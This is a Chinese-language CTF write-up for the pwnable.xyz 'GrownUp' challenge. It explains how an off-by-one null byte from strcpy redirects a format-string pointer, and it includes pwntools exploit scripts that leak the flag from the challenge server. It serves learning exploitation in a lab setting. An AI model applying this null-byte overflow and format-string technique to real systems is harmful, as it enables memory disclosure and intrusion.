pwnable.xyz GrownUp WriteUp

2019年09月12日 532 字 大概 2 分钟 ctf pwn

pwnable.xyz 上的GrownUp的WriteUp。

题目

一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对

实际上是提示了我们服务器端的flag地址是0x601080

开始正经做题，似乎难以下手，但是注意到printf(qword_601160, usr)这一行可能有格式化字符串漏洞。

在gdb中发现qword_601160的值为0x601168

而qword_601160和usr的距离是0x80 = 128

read(0, src, 0x80uLL)
strcpy(usr, src);

这两行乍一看也没有问题

关键 ：strcpy()函数会在复制结束后在目标字符串后添加结束符/x00 ；read()则不会。

由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的/x00就会溢出到0x601160，并且由于小端序，会覆盖原来的/x68，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用%s将其输出.

from pwn import * 
context.log_level = 'DEBUG'
sh = process('./GrownUpRedist')
flag = 0x601080
payload = ''
payload += 'y' * 8 + p64(flag)
sh.recvuntil('Are you 18 years or older? [y/N]: ')
sh.send(payload)
payload = ''
payload = 'A' * 32 + '%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p '

length = len(payload)
payload += 'A' * (128 - length)

sh.recvuntil('Name: ')
sh.sendline(payload)
print(sh.recvall())
sh.interactive()

在试运行时发现

第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为%s即可得flag。

EXP

#encoding:utf-8
from pwn import * 
context.log_level = 'DEBUG'
#sh = process('./GrownUpRedist')
sh = remote('svc.pwnable.xyz',30004)
flag = 0x601080
payload = ''
payload += 'y' * 8 + p64(flag)
sh.recvuntil('Are you 18 years or older? [y/N]: ')
sh.send(payload)
#这里如果是sendline()就会报错 原因不明
payload = ''
payload = 'A' * 32 + '%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p '
#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flag
length = len(payload)
payload += 'A' * (128 - length)
#payload.ljust(128,'A')
#print(payload)
sh.recvuntil('Name: ')
sh.sendline(payload)
print(sh.recvall())
sh.interactive()
